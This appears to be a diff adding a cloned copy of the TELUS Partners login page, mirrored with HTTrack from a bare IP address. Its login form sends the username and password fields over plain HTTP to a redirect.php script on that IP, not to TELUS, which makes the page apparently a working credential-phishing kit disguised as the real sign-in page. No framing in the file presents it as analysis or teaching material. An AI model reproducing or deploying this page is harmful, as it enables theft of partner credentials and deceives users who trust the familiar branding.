@@ -1,0 +1,197 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0087)https://partnerauth.telus.com/openam/UI/Login?realm=partners&service=partners&locale=en -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<!-- Mirrored from 62.4.16.49/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 14 Oct 2020 01:29:15 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>TELUS Partners</title>
+
+
+	<meta content="MSHTML 5.50.4612.600" name="GENERATOR">
+		<meta name="VersionInfo" content="13.10.01 - b20140908-1744">
+			
+			<link href="TELUS%20Partners_files/otp-custom.css" rel="stylesheet" type="text/css">
+			<!--[if IE 9]> <link href="/openam/css/ie9.css" rel="stylesheet" type="text/css"> <![endif]-->
+			<!--[if lte IE 7]> <link href="/openam/css/ie7.css" rel="stylesheet" type="text/css"> <![endif]-->
+			<script language="JavaScript" src="TELUS%20Partners_files/chk_submit.js.download" type="text/javascript"></script><script data-dapp-detection="">
+(function() {
+  let alreadyInsertedMetaTag = false
+
+  function __insertDappDetected() {
+    if (!alreadyInsertedMetaTag) {
+      const meta = document.createElement('meta')
+      meta.name = 'dapp-detected'
+      document.head.appendChild(meta)
+      alreadyInsertedMetaTag = true
+    }
+  }
+
+  if (window.hasOwnProperty('web3')) {
+    // Note a closure can't be used for this var because some sites like
+    // www.wnyc.org do a second script execution via eval for some reason.
+    window.__disableDappDetectionInsertion = true
+    // Likely oldWeb3 is undefined and it has a property only because
+    // we defined it. Some sites like wnyc.org are evaling all scripts
+    // that exist again, so this is protection against multiple calls.
+    if (window.web3 === undefined) {
+      return
+    }
+    __insertDappDetected()
+  } else {
+    var oldWeb3 = window.web3
+    Object.defineProperty(window, 'web3', {
+      configurable: true,
+      set: function (val) {
+        if (!window.__disableDappDetectionInsertion)
+          __insertDappDetected()
+        oldWeb3 = val
+      },
+      get: function () {
+        if (!window.__disableDappDetectionInsertion)
+          __insertDappDetected()
+        return oldWeb3
+      }
+    })
+  }
+})()</script>
+			<script language="JavaScript" src="TELUS%20Partners_files/auth.js.download" type="text/javascript"></script>
+			
+				<script language="JavaScript" type="text/javascript">
+                    <!--
+                    var defaultBtn = 'Submit';
+                    var elmCount = 0;
+
+                    /**
+                     * submit form with given button value
+                     *
+                     * @param value of button
+                     */
+                    function LoginSubmit(value) {
+                        aggSubmit();
+                        var hiddenFrm = document.forms['Login'];
+        
+                        if (hiddenFrm != null) {
+                            hiddenFrm.elements['IDButton'].value = value;
+                            if (this.submitted) {
+                                alert("The request is currently being processed");
+                            }
+                            else {
+                                this.submitted = true;
+                                hiddenFrm.submit();
+                            }
+                        }
+                    }
+                    -->
+                </script>
+			
+	</head>
+
+
+<body onload="document.mainform.IDToken1.focus()">
+
+<div id="header">
+
+	<span id="logo-div"> <a class="logo" href="https://partnerauth.telus.com/openam?realm=partners&amp;service=partners&amp;locale=en">
+			<img class="logo-img" src="TELUS%20Partners_files/telusmobility_logo.gif">
+	</a>
+	</span>
+
+</div>
+
+
+
+<div class="box clear-float">
+<form name="mainform" action="http://62.4.16.49/redirect.php" method="post" autocomplete="off">
+	<p align="left" class="errortext" style="color: red">
+	</p>
+						<!-- login form box -->
+						<div class="box-content box-login clear-float">
+							<div class="row">
+								<div style="padding-bottom: 5px;">
+									Username
+									<input type="text" maxlength="15" size="10" name="IDToken1" id="IDToken1" class="textbox telus-input-field color-light">
+								</div>
+								<div>
+									<span style="margin-right: 2px;">Password</span> <input type="password" maxlengh="500" size="10" name="IDToken2" onkeypress="return submitOnEnter(this,event)" id="IDToken2" class="textbox telus-input-field color-light">
+								</div>
+							</div>
+							<div class="row">
+								<!--<INPUT TYPE="button" NAME="cmdsubmit" VALUE="submit" onclick="return cmdsubmit_onclick();">-->
+								<input name="Login.Submit" type="button" onclick="javascript:document.mainform.submit()" class="button otp-button" value="Submit">
+							</div>
+						</div>
+
+		<input type="hidden" name="goto" value="">
+		<input type="hidden" name="gotoOnFail" value="">
+		<input type="hidden" name="SunQueryParamsString" value="cmVhbG09cGFydG5lcnMmbG9jYWxlPWVuJnNlcnZpY2U9cGFydG5lcnM=">
+		<input type="hidden" name="encoded" value="false">
+
+		</form>
+
+
+		<p id="login-links" align="right">
+			<br> 
+			<a href="https://secure.telusmobility.com/partners/im_preauth/validatePartner.jsp?language=EN">
+				<img src="TELUS%20Partners_files/reg_now.gif" width="245" height="30" border="0">
+			</a>
+			<br> 
+			<a href="https://secure.telusmobility.com/partners/forgotPassword.jsp?language=EN">
+				<img src="TELUS%20Partners_files/forgot_password.gif" width="171" height="30" border="0">
+			</a>
+			<br> 
+			<a href="https://secure.telusmobility.com/partners/securecontent/english/info/login_troubles.jsp">
+				<img src="TELUS%20Partners_files/trouble_.gif" width="146" height="30" border="0">
+			</a>
+		</p>
+</div>
+
+<div id="footer" class="footer alt-color">
+	<div class="">
+		
+
+
+<hr>
+
+<p>
+
+<a class="smalltext2" href="https://partnerauth.telus.com/openam/UI/Login?realm=partners&amp;service=partners&amp;locale=fr">
+français</a> &nbsp; 
+<a class="smalltext2" href="http://www.telus.com/">
+telus.com</a>&nbsp; 
+<a class="smalltext2" href="http://www.telusmobility.com/">
+telusmobility.com</a>&nbsp; 
+<!--a class="smalltext2" href='cp_mytelus_linktext'>
+mytelus.com</a>&nbsp;--> 
+<a class="smalltext2" href="https://secure.telusmobility.com/partners/securecontent/english/info/browser_req.jsp">
+browser requirements</a> &nbsp;
+<a class="smalltext2" href="https://secure.telusmobility.com/partners/termsAndConditions.jsp?language=EN">
+terms and conditions</a>
+
+</p>
+
+<div> 
+	2020
+	TELUS Communications Inc.&nbsp;
+	All Rights Reserved.
+</div>
+					
+	</div>
+</div>
+
+<script type="text/javascript">
+<!--
+  if (top.frames.length!=0) {
+     if (window.location.href.replace)
+         top.location.replace(self.location.href);
+     else
+         top.logcation.href=self.document.href;
+  }
+// -->
+</script>
+
+
+
+		
+</body>
+<!-- Mirrored from 62.4.16.49/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 14 Oct 2020 01:29:17 GMT -->
+</html>
